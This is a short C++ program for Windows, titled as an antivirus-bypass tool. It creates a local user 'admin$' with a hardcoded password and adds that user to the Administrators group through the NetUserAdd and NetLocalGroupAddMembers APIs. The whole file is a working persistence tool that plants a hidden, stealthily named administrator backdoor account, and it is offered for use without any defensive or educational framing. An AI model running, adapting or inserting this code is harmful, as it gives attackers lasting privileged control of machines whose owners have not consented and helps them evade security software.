# bypass_AV_adduser_administrator
# admin$ admin!@#45
# by ruoji
# 2024-7-30
#include <string>
#include <vector>
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <windows.h> 
#include <lm.h>

int wmain(int argc, wchar_t* argv[])
{
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 lmi3;
    DWORD dwLevel = 1;
    DWORD dwError = 0;
    NET_API_STATUS nStatus;

    // Default server name (local computer)
    wchar_t serverName[] = L"\\\\.";

    //
    // Set up the USER_INFO_1 structure.
    //  USER_PRIV_USER: name identifies a user, 
    //    rather than an administrator or a guest.
    //  UF_SCRIPT: required 
    //
    std::wstring username = L"admin$";
    std::wstring password = L"admin!@#45";

    std::vector<wchar_t> usernameBuffer(username.begin(), username.end());
    usernameBuffer.push_back(L'\0'); // Null-terminate the string
    std::vector<wchar_t> passwordBuffer(password.begin(), password.end());
    passwordBuffer.push_back(L'\0'); // Null-terminate the string

    ui.usri1_name = &usernameBuffer[0];
    ui.usri1_password = &passwordBuffer[0];
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;

    //
    // Call the NetUserAdd function, specifying level 1.
    //
    nStatus = NetUserAdd(serverName,
        dwLevel,
        (LPBYTE)&ui,
        &dwError);

    //
    // If the call succeeds, inform the user.
    //
    if (nStatus == NERR_Success)
    {
        fwprintf(stderr, L"User admin$ has been successfully added on %s\n", serverName);

        // Add the user to the Administrators group
        lmi3.lgrmi3_domainandname = &usernameBuffer[0];
        nStatus = NetLocalGroupAddMembers(serverName,
            L"Administrators",
            3,
            (LPBYTE)&lmi3,
            1);
        if (nStatus == NERR_Success)
        {
            fwprintf(stderr, L"User admin$ has been added to the Administrators group\n");
        }
        else
        {
            fprintf(stderr, "Failed to add user to the Administrators group: %d\n", nStatus);
        }
    }
    //
    // Otherwise, print the system error.
    //
    else
    {
        fprintf(stderr, "A system error has occurred: %d\n", nStatus);
    }

    return 0;
}
